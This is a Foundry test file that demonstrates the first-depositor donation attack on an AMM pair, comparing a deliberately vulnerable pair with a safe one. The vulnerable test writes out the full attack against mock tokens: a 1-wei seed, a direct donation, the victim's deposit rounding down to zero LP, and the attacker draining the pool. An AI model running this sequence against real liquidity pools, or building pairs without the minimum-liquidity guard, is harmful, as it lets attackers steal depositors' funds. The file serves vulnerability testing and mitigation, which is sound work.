// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {IERC20, VulnerablePair, SafePair} from "../src/amm/Pair.sol";

/// PoC for the AMM-pair first-deposit / share-skim manipulation (UniV2-fork inflation variant).
///   forge test --match-contract FirstDepositSkim -vvv
///
/// Invariant (SC07): a later liquidity provider's minted LP must reflect their fair share; no
/// first-depositor donation can drive a subsequent provider's mint to zero. Locking
/// MINIMUM_LIQUIDITY on the first mint + rejecting zero-LP mints holds.
///
/// See docs/exploits/first-deposit-amm-skim.md
contract FirstDepositSkimTest is Test {
    MockERC20 tokenA;
    MockERC20 tokenB;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        tokenA = new MockERC20();
        tokenB = new MockERC20();
        tokenA.mint(attacker, 20_000e18);
        tokenB.mint(attacker, 20_000e18);
        tokenA.mint(victim, 5_000e18);
        tokenB.mint(victim, 5_000e18);
    }

    function _approve(address who, address pair) internal {
        vm.startPrank(who);
        tokenA.approve(pair, type(uint256).max);
        tokenB.approve(pair, type(uint256).max);
        vm.stopPrank();
    }

    function test_vulnerable_firstDepositorSkimsSecond() public {
        VulnerablePair pair = new VulnerablePair(IERC20(address(tokenA)), IERC20(address(tokenB)));
        _approve(attacker, address(pair));
        _approve(victim, address(pair));

        // 1) Attacker seeds the pool with 1 wei each -> 1 LP, holding 100% of supply.
        vm.prank(attacker);
        pair.addLiquidity(1, 1);

        // 2) Attacker donates directly to inflate the value of that 1 LP.
        vm.startPrank(attacker);
        tokenA.transfer(address(pair), 10_000e18);
        tokenB.transfer(address(pair), 10_000e18);
        vm.stopPrank();

        // 3) Victim adds real liquidity but their min() round-down mints ZERO LP.
        vm.prank(victim);
        uint256 vLp = pair.addLiquidity(5_000e18, 5_000e18);
        assertEq(vLp, 0, "victim minted zero LP despite depositing 5000 each");

        // 4) Attacker (still the entire supply) redeems the whole pool, including the victim's deposit.
        uint256 attackerLp = pair.balanceOf(attacker);
        vm.prank(attacker);
        pair.removeLiquidity(attackerLp);

        assertEq(tokenA.balanceOf(attacker), 25_000e18, "attacker skimmed the victim's 5000 tokenA");
        assertEq(tokenA.balanceOf(victim), 0, "victim's deposit was absorbed");
    }

    function test_safe_minLiquidityBlocksSkim() public {
        SafePair pair = new SafePair(IERC20(address(tokenA)), IERC20(address(tokenB)));
        _approve(attacker, address(pair));
        _approve(victim, address(pair));

        // A dust first mint reverts (MINIMUM_LIQUIDITY underflow) -> the skim setup is impossible.
        vm.prank(attacker);
        vm.expectRevert();
        pair.addLiquidity(1, 1);

        // A realistic pool: attacker seeds 10000 each (1000 LP locked forever).
        vm.prank(attacker);
        pair.addLiquidity(10_000e18, 10_000e18);

        // Attacker still tries the donation play.
        vm.startPrank(attacker);
        tokenA.transfer(address(pair), 10_000e18);
        tokenB.transfer(address(pair), 10_000e18);
        vm.stopPrank();

        // Victim adds proportional liquidity and gets a fair, NON-zero LP balance.
        vm.prank(victim);
        uint256 vLp = pair.addLiquidity(5_000e18, 5_000e18);
        assertGt(vLp, 0, "victim minted real LP");

        // Victim redeems ~their deposit; they were not skimmed.
        vm.prank(victim);
        (uint256 outA,) = pair.removeLiquidity(vLp);
        assertEq(outA, 5_000e18, "victim recovers their fair share");
    }
}
